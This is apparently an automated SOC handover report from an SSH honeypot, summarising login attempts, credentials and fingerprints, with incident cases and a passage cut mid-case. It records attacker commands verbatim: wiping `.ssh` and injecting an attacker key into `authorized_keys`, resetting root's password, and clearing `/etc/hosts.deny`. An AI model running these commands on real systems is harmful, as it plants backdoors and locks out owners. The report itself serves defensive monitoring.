# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T10:31:54Z |
| **Shift Time** | 10:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **157** |
| Confirmed Threats | **127** |
| False Positives Filtered | **30** (19.1%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **16** |
| High Severity Cases | **49** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **108** |
| Malware Samples Analyzed | **0** HIGH · **14** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **123** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **33** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `345gs5662d34` | 24 |
| `ubuntu` | 9 |
| `user` | 3 |
| `support` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 23 |
| `password` | 4 |
| `123456` | 3 |
| `Password1@` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 23 |
| `ubuntu` | `Password1@` | 3 |
| `bob` | `test` | 2 |
| `root` | `p@ssw0Rd` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx11111111` | `49.64.86.110` | 2026-04-04T08:38:33 |
| `root` | `zaq!@#123` | `213.225.8.230` | 2026-04-04T08:39:42 |
| `root` | `3245gs5662d34` | `213.225.8.230` | 2026-04-04T08:39:46 |
| `root` | `QQdd000` | `213.225.8.230` | 2026-04-04T08:42:02 |
| `root` | `qwe123QWE` | `213.225.8.230` | 2026-04-04T08:46:54 |
| `root` | `31415926` | `213.225.8.230` | 2026-04-04T08:49:19 |
| `root` | `woaini123.` | `213.225.8.230` | 2026-04-04T08:51:52 |
| `root` | `12332100` | `213.225.8.230` | 2026-04-04T08:54:18 |
| `root` | `root4321#` | `213.225.8.230` | 2026-04-04T09:01:33 |
| `root` | `ccBB112233` | `202.125.94.71` | 2026-04-04T09:15:44 |
| `root` | `3245gs5662d34` | `202.125.94.71` | 2026-04-04T09:15:47 |
| `root` | `Qw123456789` | `213.225.8.230` | 2026-04-04T09:16:40 |
| `root` | `p@ssw0Rd` | `118.193.33.81` | 2026-04-04T09:19:15 |
| `root` | `3245gs5662d34` | `118.193.33.81` | 2026-04-04T09:19:18 |
| `root` | `!QAZ2wsx2025` | `118.193.33.81` | 2026-04-04T09:21:31 |
| `root` | `123445` | `213.225.8.230` | 2026-04-04T09:24:10 |
| `root` | `QWERTYU12345` | `118.193.33.81` | 2026-04-04T09:25:53 |
| `root` | `Qwe2026@` | `118.193.33.81` | 2026-04-04T09:30:18 |
| `root` | `88888` | `60.167.19.189` | 2026-04-04T09:33:12 |
| `root` | `88888` | `186.222.55.187` | 2026-04-04T09:33:21 |
| `root` | `qazwsx001!@#` | `213.225.8.230` | 2026-04-04T09:34:00 |
| `root` | `qwerty!12345` | `213.225.8.230` | 2026-04-04T09:36:29 |
| `root` | `1234ASDF` | `118.193.33.81` | 2026-04-04T09:39:18 |
| `root` | `bbZZ000` | `118.193.33.81` | 2026-04-04T09:41:30 |
| `root` | `ai@123456` | `118.193.33.81` | 2026-04-04T09:48:12 |
| `root` | `QWEasd123456` | `118.193.33.81` | 2026-04-04T09:50:31 |
| `root` | `abc13579` | `118.193.33.81` | 2026-04-04T09:52:46 |
| `root` | `root03` | `118.193.33.81` | 2026-04-04T10:01:43 |
| `root` | `p@ssw0Rd` | `103.20.122.54` | 2026-04-04T10:13:03 |
| `root` | `3245gs5662d34` | `103.20.122.54` | 2026-04-04T10:13:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **157** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 112 |
| OpenSSH | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 112 | 7 |
| `acaa53e0a7d7...` | Mirai/variant | 14 | 14 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 112 | 7 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 14 | 14 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:aBqgtrGYqRue"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.64.86.110`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `213.225.8.230`, `118.193.33.81`, `202.125.94.71`, `103.20.122.54`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **21** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS55330` | AFGHANTELECOM GOVERNMENT COMMUNICATION NETWORK | 1 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | HIGH |
| `AS2856` | British Telecommunications PLC | 1 | MEDIUM |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS6079` | RCN | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (49)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3209e052c083

| Field | Detail |
|---|---|
| **Source IP** | `49.64.86[.]110` |
| **First Seen** | 2026-04-04 08:38 |
| **Last Seen** | 2026-04-04 08:38 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aBqgtrGYqRue"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:38:27` | `cowrie.session.connect` |
| `2026-04-04 08:38:31` | `cowrie.client.version` |
| `2026-04-04 08:38:31` | `cowrie.client.kex` |
| `2026-04-04 08:38:33` | `cowrie.login.success` |
| `2026-04-04 08:38:36` | `cowrie.session.params` |
| `2026-04-04 08:38:36` | `cowrie.command.input` |
| `2026-04-04 08:38:36` | `cowrie.command.failed` |
| `2026-04-04 08:38:37` | `cowrie.log.closed` |
| `2026-04-04 08:38:38` | `cowrie.session.params` |
| `2026-04-04 08:38:38` | `cowrie.command.input` |
| `2026-04-04 08:38:38` | `cowrie.session.file_download` |
| `2026-04-04 08:38:38` | `cowrie.log.closed` |
| `2026-04-04 08:38:47` | `cowrie.session.params` |
| `2026-04-04 08:38:47` | `cowrie.command.input` |
| `2026-04-04 08:38:48` | `cowrie.log.closed` |
| `2026-04-04 08:38:48` | `cowrie.session.params` |
| `2026-04-04 08:38:48` | `cowrie.command.input` |
| `2026-04-04 08:38:48` | `cowrie.log.closed` |
| `2026-04-04 08:38:48` | `cowrie.session.params` |
| `2026-04-04 08:38:48` | `cowrie.command.input` |
| `2026-04-04 08:38:49` | `cowrie.session.file_download` |
| `2026-04-04 08:38:49` | `cowrie.log.closed` |
| `2026-04-04 08:38:49` | `cowrie.session.params` |
| `2026-04-04 08:38:49` | `cowrie.command.input` |
| `2026-04-04 08:38:49` | `cowrie.log.closed` |
| `2026-04-04 08:38:49` | `cowrie.session.params` |
| `2026-04-04 08:38:49` | `cowrie.command.input` |
| `2026-04-04 08:38:50` | `cowrie.log.closed` |
| `2026-04-04 08:38:50` | `cowrie.session.params` |
| `2026-04-04 08:38:50` | `cowrie.command.input` |
| `2026-04-04 08:38:50` | `cowrie.command.input` |
| `2026-04-04 08:38:50` | `cowrie.log.closed` |
| `2026-04-04 08:38:50` | `cowrie.session.params` |
| `2026-04-04 08:38:50` | `cowrie.command.input` |
| `2026-04-04 08:38:50` | `cowrie.log.closed` |
| `2026-04-04 08:38:51` | `cowrie.session.params` |
| `2026-04-04 08:38:51` | `cowrie.command.input` |
| `2026-04-04 08:38:51` | `cowrie.log.closed` |
| `2026-04-04 08:38:51` | `cowrie.session.params` |
| `2026-04-04 08:38:51` | `cowrie.command.input` |
| `2026-04-04 08:38:51` | `cowrie.log.closed` |
| `2026-04-04 08:38:52` | `cowrie.session.params` |
| `2026-04-04 08:38:52` | `cowrie.command.input` |
| `2026-04-04 08:38:52` | `cowrie.log.closed` |
| `2026-04-04 08:38:52` | `cowrie.session.params` |
| `2026-04-04 08:38:52` | `cowrie.command.input` |
| `2026-04-04 08:38:52` | `cowrie.log.closed` |
| `2026-04-04 08:38:53` | `cowrie.session.params` |
| `2026-04-04 08:38:53` | `cowrie.command.input` |
| `2026-04-04 08:38:53` | `cowrie.log.closed` |
| `2026-04-04 08:38:53` | `cowrie.session.params` |
| `2026-04-04 08:38:53` | `cowrie.command.input` |
| `2026-04-04 08:38:53` | `cowrie.log.closed` |
| `2026-04-04 08:38:54` | `cowrie.session.params` |
| `2026-04-04 08:38:54` | `cowrie.command.input` |
| `2026-04-04 08:38:54` | `cowrie.log.closed` |
| `2026-04-04 08:38:54` | `cowrie.session.params` |
| `2026-04-04 08:38:54` | `cowrie.command.input` |
| `2026-04-04 08:38:54` | `cowrie.log.closed` |
| `2026-04-04 08:38:55` | `cowrie.session.params` |
| `2026-04-04 08:38:55` | `cowrie.command.input` |
| `2026-04-04 08:38:55` | `cowrie.log.closed` |
| `2026-04-04 08:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.86[.]110` to AbuseIPDB if not already reported
- [ ] Block `49.64.86[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8505918b30a

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:39 |
| **Last Seen** | 2026-04-04 08:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:39:41` | `cowrie.session.connect` |
| `2026-04-04 08:39:41` | `cowrie.client.version` |
| `2026-04-04 08:39:41` | `cowrie.client.kex` |
| `2026-04-04 08:39:42` | `cowrie.login.success` |
| `2026-04-04 08:39:42` | `cowrie.session.params` |
| `2026-04-04 08:39:42` | `cowrie.command.input` |
| `2026-04-04 08:39:42` | `cowrie.command.failed` |
| `2026-04-04 08:39:43` | `cowrie.log.closed` |
| `2026-04-04 08:39:43` | `cowrie.session.params` |
| `2026-04-04 08:39:43` | `cowrie.command.input` |
| `2026-04-04 08:39:43` | `cowrie.session.file_download` |
| `2026-04-04 08:39:43` | `cowrie.log.closed` |
| `2026-04-04 08:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53fa644e9c2

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:39 |
| **Last Seen** | 2026-04-04 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:39:46` | `cowrie.session.connect` |
| `2026-04-04 08:39:46` | `cowrie.client.version` |
| `2026-04-04 08:39:46` | `cowrie.client.kex` |
| `2026-04-04 08:39:46` | `cowrie.login.success` |
| `2026-04-04 08:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a778d373f254

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:42 |
| **Last Seen** | 2026-04-04 08:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:42:01` | `cowrie.session.connect` |
| `2026-04-04 08:42:01` | `cowrie.client.version` |
| `2026-04-04 08:42:01` | `cowrie.client.kex` |
| `2026-04-04 08:42:02` | `cowrie.login.success` |
| `2026-04-04 08:42:02` | `cowrie.session.params` |
| `2026-04-04 08:42:02` | `cowrie.command.input` |
| `2026-04-04 08:42:02` | `cowrie.command.failed` |
| `2026-04-04 08:42:03` | `cowrie.log.closed` |
| `2026-04-04 08:42:03` | `cowrie.session.params` |
| `2026-04-04 08:42:03` | `cowrie.command.input` |
| `2026-04-04 08:42:03` | `cowrie.session.file_download` |
| `2026-04-04 08:42:03` | `cowrie.log.closed` |
| `2026-04-04 08:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b688bd0e82

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:42 |
| **Last Seen** | 2026-04-04 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:42:06` | `cowrie.session.connect` |
| `2026-04-04 08:42:06` | `cowrie.client.version` |
| `2026-04-04 08:42:06` | `cowrie.client.kex` |
| `2026-04-04 08:42:06` | `cowrie.login.success` |
| `2026-04-04 08:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45cde43138eb

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:46 |
| **Last Seen** | 2026-04-04 08:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:46:53` | `cowrie.session.connect` |
| `2026-04-04 08:46:53` | `cowrie.client.version` |
| `2026-04-04 08:46:54` | `cowrie.client.kex` |
| `2026-04-04 08:46:54` | `cowrie.login.success` |
| `2026-04-04 08:46:55` | `cowrie.session.params` |
| `2026-04-04 08:46:55` | `cowrie.command.input` |
| `2026-04-04 08:46:55` | `cowrie.command.failed` |
| `2026-04-04 08:46:55` | `cowrie.log.closed` |
| `2026-04-04 08:46:55` | `cowrie.session.params` |
| `2026-04-04 08:46:55` | `cowrie.command.input` |
| `2026-04-04 08:46:56` | `cowrie.session.file_download` |
| `2026-04-04 08:46:56` | `cowrie.log.closed` |
| `2026-04-04 08:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a30249ced67

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:46 |
| **Last Seen** | 2026-04-04 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:46:58` | `cowrie.session.connect` |
| `2026-04-04 08:46:58` | `cowrie.client.version` |
| `2026-04-04 08:46:58` | `cowrie.client.kex` |
| `2026-04-04 08:46:59` | `cowrie.login.success` |
| `2026-04-04 08:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad756d9acb79

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:49 |
| **Last Seen** | 2026-04-04 08:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:49:18` | `cowrie.session.connect` |
| `2026-04-04 08:49:18` | `cowrie.client.version` |
| `2026-04-04 08:49:18` | `cowrie.client.kex` |
| `2026-04-04 08:49:19` | `cowrie.login.success` |
| `2026-04-04 08:49:19` | `cowrie.session.params` |
| `2026-04-04 08:49:19` | `cowrie.command.input` |
| `2026-04-04 08:49:19` | `cowrie.command.failed` |
| `2026-04-04 08:49:20` | `cowrie.log.closed` |
| `2026-04-04 08:49:20` | `cowrie.session.params` |
| `2026-04-04 08:49:20` | `cowrie.command.input` |
| `2026-04-04 08:49:20` | `cowrie.session.file_download` |
| `2026-04-04 08:49:20` | `cowrie.log.closed` |
| `2026-04-04 08:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af13fc7aeaf1

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:49 |
| **Last Seen** | 2026-04-04 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:49:23` | `cowrie.session.connect` |
| `2026-04-04 08:49:23` | `cowrie.client.version` |
| `2026-04-04 08:49:23` | `cowrie.client.kex` |
| `2026-04-04 08:49:23` | `cowrie.login.success` |
| `2026-04-04 08:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801c4a4eecd2

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:51 |
| **Last Seen** | 2026-04-04 08:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
